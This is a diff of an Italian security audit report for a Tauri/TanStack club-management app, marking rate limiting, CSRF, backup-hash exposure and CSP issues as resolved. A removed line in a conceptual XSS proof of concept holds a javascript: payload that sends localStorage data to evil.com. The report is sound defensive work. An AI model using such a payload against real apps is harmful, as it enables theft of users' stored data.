@@ -1,7 +1,7 @@
 # Security Audit Report - Gestore Pub
 
-**Data Analisi:** 2026-06-15  
-**Versione Applicazione:** 1.0.11  
+**Data Analisi:** 2026-06-17
+**Versione Applicazione:** 1.0.15
 **Tipologia:** Applicazione locale per gestione soci e presenze (Club Privato)  
 **Stack Tecnologico:** React 19, TanStack Start, Prisma ORM, SQLite, Tauri 2 (Desktop)  
 **Ambiente:** Single-page application con backend integrato (Server Functions), deployabile come web app o app desktop Tauri
@@ -9,9 +9,10 @@
 **Stato mitigazioni (2026-06-15):** le vulnerabilità principali sono state indirizzate nel codice:
 - rate limiting login/recupero persistente su SQLite tramite `RateLimitAttempt`;
 - protezione CSRF globale per richieste non-GET con controllo `Origin`/`Sec-Fetch-Site`;
-- backup standard senza hash password/frase recupero, con backup completo separato lato server;
+- backup standard senza hash password/frase recupero; l'esportazione completa con credenziali è stata rimossa dalle API pubbliche;
 - percorsi login/recupero uniformati contro username enumeration;
 - CSP Tauri abilitata;
+- database desktop Tauri spostato da `localStorage` WebView a file locale `desktop-db.json` nella cartella dati dell'app, con migrazione automatica dal vecchio storage;
 - DevTools limitati alla modalità `serve`;
 - rotazione sessioni su login, cambio password e cambio frase recupero.
 
@@ -21,15 +22,17 @@
 
 L'applicazione **Gestore Pub** presenta un **livello di sicurezza complessivamente BUONO** per un'applicazione locale di gestione club, con un'architettura moderna basata su TanStack Start che separa chiaramente codice client/server. L'uso di Prisma ORM mitiga efficacemente i rischi di SQL Injection, l'autenticazione utilizza PBKDF2-SHA512 con 310.000 iterazioni (superiore alle raccomandazioni OWASP), e i cookie di sessione sono configurati correttamente (HttpOnly, Secure, SameSite=Strict).
 
-Tuttavia, sono state identificate **4 vulnerabilità di severità Media**, **3 di severità Bassa** e diverse aree di miglioramento che richiedono attenzione prima di un deployment in produzione, in particolare per la gestione del rate limiting in-memory, l'assenza di protezione CSRF, l'esposizione di hash sensibili nei backup, e la mancanza di Content Security Policy nell'app Tauri.
+Le vulnerabilità principali identificate nella prima analisi sono state mitigate per lo scenario di consegna previsto: **app desktop locale distribuita tramite GitHub Releases**. Restano aree di miglioramento operative per un uso più maturo: code signing, protezione del filesystem/account OS, backup cifrati, test di sicurezza più estesi e hardening specifico se l'app venisse esposta come servizio web pubblico.
 
-**Rischio Residuo Stimato:** **MEDIO-ALTO** per deployment web esposto su rete; **BASSO-MEDIO** per uso esclusivamente locale/desktop (Tauri).
+**Rischio Residuo Stimato:** **MEDIO** per deployment web esposto su rete; **BASSO-MEDIO** per uso esclusivamente locale/desktop (Tauri) su computer protetto.
 
 ---
 
 ## 2. Vulnerabilità Identificate
 
-### 2.1 [MEDIA] Rate Limiting In-Memory Non Persistente né Distribuito
+### 2.1 [RISOLTA] Rate Limiting In-Memory Non Persistente né Distribuito
+
+**Stato attuale:** risolto con tabella SQLite `RateLimitAttempt`, persistente tra riavvii.
 
 **File:** `src/lib/api.functions.ts` (righe 160-220)
 
@@ -69,7 +72,9 @@ async function assertLoginAllowed(username: string) {
 
 ---
 
-### 2.2 [MEDIA] Assenza Protezione CSRF per Server Functions
+### 2.2 [RISOLTA] Assenza Protezione CSRF per Server Functions
+
+**Stato attuale:** risolto con middleware globale in `src/start.ts` per richieste non-GET, basato su `Origin` e `Sec-Fetch-Site`.
 
 **File:** `src/lib/api.functions.ts` (tutte le `createServerFn`)
 
@@ -105,7 +110,9 @@ export const csrfMiddleware = createMiddleware({ type: 'function' })
 
 ---
 
-### 2.3 [MEDIA] Esposizione Hash Password e Recovery Phrase nei Backup
+### 2.3 [RISOLTA] Esposizione Hash Password e Recovery Phrase nei Backup
+
+**Stato attuale:** il backup standard non include hash password o hash risposta recupero. L'esportazione completa con credenziali non è esposta dalle API pubbliche; il restore accetta ancora vecchi backup completi solo per compatibilità/migrazione.
 
 **File:** `src/lib/api.functions.ts` (funzione `exportBackupFn`, righe 1150-1250)
 
@@ -197,16 +204,18 @@ export const loginFn = createServerFn({ method: 'POST' })
 
 ---
 
-### 2.5 [BASSA] Content Security Policy Assente in Tauri
+### 2.5 [RISOLTA] Content Security Policy Assente in Tauri
 
-**File:** `src-tauri/tauri.conf.json` (riga 18: `"csp": null`)
+**File:** `src-tauri/tauri.conf.json`
+
+**Stato attuale:** CSP restrittiva configurata nel bundle Tauri.
 
 **Descrizione:**  
-L'applicazione Tauri disabilita completamente la CSP (`null`). In caso di XSS (es. via QR code malevolo, import backup corrotto, o future feature), l'attaccante può eseguire JavaScript arbitrario nel contesto dell'app desktop con accesso alle API Tauri (filesystem, shell, ecc.).
+Nella prima analisi l'applicazione Tauri non aveva una CSP restrittiva. In caso di XSS (es. via QR code malevolo, import backup corrotto, o future feature), un attaccante avrebbe potuto eseguire JavaScript arbitrario nel contesto dell'app desktop.
 
 **Scenario di Attacco (PoC Concettuale):**
 ```javascript
-// QR code contenente: javascript:fetch('http://evil.com/steal?data='+localStorage.getItem('gestore-pub:desktop-db'))
+// Vecchie versioni: QR code contenente payload malevolo per leggere dati dalla WebView
 // Se scanner usa eval() o innerHTML non sanificato -> XSS -> RCE via Tauri API
 ```
 
@@ -292,7 +301,7 @@ plugins: [
 1. **Server Functions (TanStack Start):** Boundary client/server - tutte le mutazioni passano qui. Punto singolo di controllo ma anche singolo punto di fallimento.
 2. **Prisma ORM:** Mitiga SQLi ma attenzione a `prisma.$queryRaw` (non usato nel codice analizzato - **OK**).
 3. **Cookie di Sessione:** Unico meccanismo auth - **nessun header Authorization/Bearer token** (buono per CSRF, ma limita API programmatiche).
-4. **Tauri IPC:** `desktop-api.ts` espone funzioni al frontend - verificare `allowlist` in `tauri.conf.json` (non presente nel config analizzato).
+4. **Tauri IPC:** `src-tauri/src/main.rs` espone solo comandi custom per cartella export e database desktop in `app_data_dir`; mantenerli limitati a path applicativi e input validati.
 5. **File System Access (Tauri):** `saveTextFile`/`savePdfDocument` usano File System Access API - richiede permesso utente, **OK**.
 
 ### 3.3 Flusso Dati Sensibili
@@ -310,7 +319,7 @@ plugins: [
        │              │           │                  │
        ▼              ▼           ▼                  ▼
 ┌─────────────┐  ┌──────────┐ ┌────────┐      ┌──────────┐
-│ localStorage│  │ Cookies  │ │ Memory │      │  Backup  │
+│ App Data DB │  │ Cookies  │ │ Memory │      │  Backup  │
 │ (Desktop)   │  │ (Session)│ │ (RateL)│      │  (JSON)  │
 └─────────────┘  └──────────┘ └────────┘      └──────────┘
                                                     │
@@ -364,34 +373,17 @@ export default defineConfig({
 ```
 
 ```json
-// 3. tauri.conf.json - CSP e allowlist minimi
+// 3. tauri.conf.json - CSP minima Tauri v2
 {
   "app": {
     "security": {
       "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';"
     }
-  },
-  "allowlist": {
-    "all": false,
-    "fs": {
-      "all": false,
-      "readFile": true,
-      "writeFile": true,
-      "createDir": true,
-      "removeFile": true
-    },
-    "dialog": {
-      "all": false,
-      "open": true,
-      "save": true
-    },
-    "shell": {
-      "all": false,
-      "open": true
-    }
   }
 }
 ```
+
+In Tauri v2 non usare esempi `allowlist` v1: il controllo principale resta sui comandi registrati in `invoke_handler`, che devono continuare a operare solo su file previsti dall'app e non su path arbitrari passati dal frontend.
 
 ### 4.3 Miglioramenti Codice Specifici
 
@@ -459,19 +451,20 @@ describe('Security: Backup', () => {
 
 1. **Compromissione Backup:** Ruotare tutte le password → `changeAdminPasswordFn` + notificare utenti reset password
 2. **Session Hijacking:** `DELETE FROM sessions` via Prisma studio → forza re-login tutti
-3. **SQLite Corruption:** Ripristino da backup più recente → verificare integrità `PRAGMA integrity_check`
+3. **Corruzione Database:** ripristino da backup più recente; per server SQLite verificare `PRAGMA integrity_check`, per desktop sostituire il file dati locale solo da backup affidabile
 4. **QR Token Leak:** Rigenerare token per membri affetti → `UPDATE member SET qr_token = ...`
 
 ---
 
 ## Allegato A: Checklist Rapida Pre-Deploy
 
-- [ ] Rate limiting persistente (Redis/SQLite) implementato
-- [ ] CSRF protection su tutte le mutazioni POST
-- [ ] Backup standard non include password/recovery hash
-- [ ] Messaggi errore login/recovery unificati (no enum)
-- [ ] CSP configurato in `tauri.conf.json`
-- [ ] DevTools rimossi da build produzione
+- [x] Rate limiting persistente (Redis/SQLite) implementato
+- [x] CSRF protection su tutte le mutazioni POST
+- [x] Backup standard non include password/recovery hash
+- [x] Messaggi errore login/recovery unificati (no enum)
+- [x] CSP configurato in `tauri.conf.json`
+- [x] Database desktop fuori da `localStorage`, in file dati app con migrazione automatica
+- [x] DevTools rimossi da build produzione
 - [ ] Headers sicurezza (HSTS, X-Frame-Options, etc.) configurati
 - [ ] Audit logging per azioni admin
 - [ ] Code signing certificati Tauri configurati
